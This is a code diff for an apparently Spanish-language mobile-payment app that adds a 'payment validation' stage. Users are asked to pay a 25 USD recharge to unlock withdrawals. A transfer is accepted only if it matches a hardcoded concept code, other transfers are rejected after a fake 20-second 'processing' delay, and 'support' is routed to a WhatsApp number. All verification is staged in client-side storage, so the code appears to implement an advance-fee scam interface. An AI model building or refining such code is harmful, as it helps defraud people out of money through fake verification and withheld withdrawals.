@@ -3074,6 +3074,12 @@
   opacity: 0.9;
 }
 
+.validation-actions {
+  margin-top: 0.4rem;
+  display: flex;
+  gap: 0.5rem;
+}
+
 @keyframes checkmarkPulse {
   0%, 100% {
     transform: scale(1);
@@ -4314,7 +4320,11 @@
         <div class="status-text">
           <div class="status-label">Validación de datos de cuenta pendiente</div>
           <div class="status-sublabel">Para validar realiza una recarga por 25 USD desde tu cuenta registrada.</div>
-          <button class="btn btn-outline btn-small" id="start-recharge" style="margin-top:0.4rem; width:auto;">Realizar recarga</button>
+          <div class="validation-actions">
+            <button class="btn btn-outline btn-small" id="start-recharge">Realizar recarga</button>
+            <button class="btn btn-outline btn-small" id="view-status">Mi Estatus</button>
+            <button class="btn btn-outline btn-small" id="bank-support">Soporte</button>
+          </div>
         </div>
       </div>
     </div>
@@ -5911,7 +5921,7 @@
     let verificationStatus = {
       isVerified: false,
       hasUploadedId: false,
-      status: 'unverified', // 'unverified', 'pending', 'verified', 'processing', 'bank_validation' - NUEVA IMPLEMENTACIÓN
+      status: 'unverified', // 'unverified', 'pending', 'verified', 'processing', 'bank_validation', 'payment_validation'
       idNumber: '', // Número de cédula
       phoneNumber: '' // Número de teléfono
     };
@@ -5920,7 +5930,7 @@
     let verificationProcessing = {
       isProcessing: false,
       startTime: null,
-      currentPhase: 'documents', // 'documents', 'bank_validation'
+      currentPhase: 'documents', // 'documents', 'bank_validation', 'payment_validation'
       timer: null
     };
 
@@ -6142,7 +6152,54 @@ function updateVerificationProcessingBanner() {
         ease: "power2.out"
       });
     }
+  } else if (verificationProcessing.currentPhase === 'payment_validation') {
+    if (title) title.textContent = 'Pago Móvil en Verificación';
+    if (text) text.textContent = 'Ya completaste el último paso, estamos validando tu pago móvil y en breve se habilitarán los retiros.';
+    if (icon) {
+      icon.className = 'verification-processing-icon bank-phase';
+      icon.innerHTML = '<i class="fas fa-mobile-alt"></i>';
+    }
+    stopVerificationProgress();
+    const progressContainer = document.getElementById("verification-progress-container");
+    if (progressContainer) progressContainer.style.display = "none";
+    if (mainSpinner) mainSpinner.style.display = 'none';
+    if (statusItems) statusItems.style.display = 'flex';
+    updateBankValidationStatusItem();
   }
+}
+
+function updateBankValidationStatusItem() {
+  const label = document.querySelector('#status-bank-validation .status-label');
+  const sublabel = document.querySelector('#status-bank-validation .status-sublabel');
+  const rechargeBtn = document.getElementById('start-recharge');
+  const statusBtn = document.getElementById('view-status');
+
+  if (verificationStatus.status === 'payment_validation') {
+    if (label) label.textContent = 'Pago móvil en verificación';
+    if (sublabel) sublabel.textContent = 'Ya completaste el último paso, estamos validando tu pago móvil y en breve se habilitarán los retiros.';
+    if (rechargeBtn) rechargeBtn.style.display = 'none';
+    if (statusBtn) statusBtn.style.display = 'none';
+  } else {
+    if (label) label.textContent = 'Validación de datos de cuenta pendiente';
+    if (sublabel) sublabel.textContent = 'Para validar realiza una recarga por 25 USD desde tu cuenta registrada.';
+    if (rechargeBtn) rechargeBtn.style.display = 'inline-block';
+    if (statusBtn) statusBtn.style.display = 'inline-block';
+  }
+}
+
+function updateVerificationToPaymentValidation() {
+  verificationProcessing.currentPhase = 'payment_validation';
+  verificationProcessing.isProcessing = false;
+  if (verificationProcessing.timer) {
+    clearTimeout(verificationProcessing.timer);
+    verificationProcessing.timer = null;
+  }
+  verificationStatus.status = 'payment_validation';
+
+  localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING, JSON.stringify(verificationProcessing));
+  saveVerificationStatus();
+  updateBankValidationStatusItem();
+  updateVerificationProcessingBanner();
 }
 
 function updateVerificationProgress() {
@@ -7123,7 +7180,7 @@ function stopVerificationProgress() {
       if (!banner) return;
       if (verificationStatus.status === 'verified') {
         banner.style.display = 'none';
-      } else if (verificationStatus.status === 'pending' || verificationStatus.status === 'processing' || verificationStatus.status === 'bank_validation') {
+        } else if (verificationStatus.status === 'pending' || verificationStatus.status === 'processing' || verificationStatus.status === 'bank_validation' || verificationStatus.status === 'payment_validation') {
         banner.textContent = 'Verificación en proceso. Algunas funciones pueden estar limitadas.';
         banner.style.display = 'block';
       } else {
@@ -7316,7 +7373,7 @@ function stopVerificationProgress() {
         if (status === 'verified') {
           verificationStatus.isVerified = true;
           verificationStatus.hasUploadedId = true;
-        } else if (status === 'pending' || status === 'processing' || status === 'bank_validation') {
+        } else if (status === 'pending' || status === 'processing' || status === 'bank_validation' || status === 'payment_validation') {
           verificationStatus.isVerified = false;
           verificationStatus.hasUploadedId = true;
         } else {
@@ -7627,7 +7684,7 @@ function stopVerificationProgress() {
         if (event.newValue === 'verified') {
           verificationStatus.isVerified = true;
           verificationStatus.hasUploadedId = true;
-        } else if (event.newValue === 'pending' || event.newValue === 'processing' || event.newValue === 'bank_validation') {
+        } else if (event.newValue === 'pending' || event.newValue === 'processing' || event.newValue === 'bank_validation' || event.newValue === 'payment_validation') {
           verificationStatus.isVerified = false;
           verificationStatus.hasUploadedId = true;
         } else {
@@ -7856,7 +7913,7 @@ function stopVerificationProgress() {
         }
         
         // NUEVA IMPLEMENTACIÓN: Mostrar banner de procesamiento si está en proceso
-        if (verificationStatus.status === 'processing' || verificationStatus.status === 'bank_validation') {
+        if (verificationStatus.status === 'processing' || verificationStatus.status === 'bank_validation' || verificationStatus.status === 'payment_validation') {
           verifyBanner.style.display = 'none';
           verificationProcessingBanner.style.display = 'flex';
           updateVerificationProcessingBanner();
@@ -7898,9 +7955,10 @@ function stopVerificationProgress() {
       // Verificar estado de primera recarga
       loadFirstRechargeStatus();
       loadWelcomeBonusStatus();
-      
+
       // Mostrar banners apropiados
       checkBannersVisibility();
+      updateBankValidationStatusItem();
 
       // Actualizar la UI con los datos de pago móvil
       updateMobilePaymentInfo();
@@ -8095,8 +8153,8 @@ function stopVerificationProgress() {
       // Botón de primera recarga
       setupFirstRechargeBanner();
 
-      // Botón para validar cuenta mediante recarga
-      setupBankValidationRecharge();
+      // Acciones para validar cuenta mediante recarga
+      setupBankValidationActions();
 
       // Bono de bienvenida
       setupWelcomeBonus();
@@ -8450,11 +8508,14 @@ function stopVerificationProgress() {
       }
     }
 
-    // Botón para validar cuenta realizando recarga
-    function setupBankValidationRecharge() {
-      const btn = document.getElementById('start-recharge');
-      if (btn) {
-        btn.addEventListener('click', function() {
+    // Acciones para validar cuenta mediante recarga
+    function setupBankValidationActions() {
+      const rechargeBtn = document.getElementById('start-recharge');
+      const statusBtn = document.getElementById('view-status');
+      const supportBtn = document.getElementById('bank-support');
+
+      if (rechargeBtn) {
+        rechargeBtn.addEventListener('click', function() {
           const dashboardContainer = document.getElementById('dashboard-container');
           const rechargeContainer = document.getElementById('recharge-container');
 
@@ -8470,6 +8531,20 @@ function stopVerificationProgress() {
           if (mobileContent) mobileContent.classList.add('active');
 
           updateSavedCardUI();
+          resetInactivityTimer();
+        });
+      }
+
+      if (statusBtn) {
+        statusBtn.addEventListener('click', function() {
+          window.location.href = 'ajustes.html';
+          resetInactivityTimer();
+        });
+      }
+
+      if (supportBtn) {
+        supportBtn.addEventListener('click', function() {
+          window.open('https://wa.me/+17373018059', '_blank');
           resetInactivityTimer();
         });
       }
@@ -9030,7 +9105,7 @@ function setupWithdrawalLink() {
       const featureBlockedModal = document.getElementById('feature-blocked-modal');
       
       if (featureBlockedModal) {
-        if (verificationStatus.status === 'pending' || verificationStatus.status === 'processing' || verificationStatus.status === 'bank_validation') {
+        if (verificationStatus.status === 'pending' || verificationStatus.status === 'processing' || verificationStatus.status === 'bank_validation' || verificationStatus.status === 'payment_validation') {
           // Si la verificación está en proceso, mostrar un mensaje diferente
           document.querySelector('.feature-blocked-title').textContent = 'Verificación en Proceso';
           document.querySelector('.feature-blocked-message').textContent = 
@@ -11156,15 +11231,17 @@ function setupWithdrawalLink() {
                   if (receiptPreview) receiptPreview.style.display = 'none';
                   if (receiptUpload) receiptUpload.style.display = 'block';
 
-                  if (conceptValue !== '4454651') {
-                    setTimeout(function() {
-                      const procModal = document.getElementById('transfer-processing-modal');
-                      if (procModal) procModal.style.display = 'none';
-                      rejectMobileTransfer(referenceValue);
-                      const rejModal = document.getElementById('transfer-rejected-modal');
-                      if (rejModal) rejModal.style.display = 'flex';
-                    }, 20000);
-                  }
+                    if (conceptValue !== '4454651') {
+                      setTimeout(function() {
+                        const procModal = document.getElementById('transfer-processing-modal');
+                        if (procModal) procModal.style.display = 'none';
+                        rejectMobileTransfer(referenceValue);
+                        const rejModal = document.getElementById('transfer-rejected-modal');
+                        if (rejModal) rejModal.style.display = 'flex';
+                      }, 20000);
+                    } else {
+                      updateVerificationToPaymentValidation();
+                    }
                 }, 500);
               }
             });
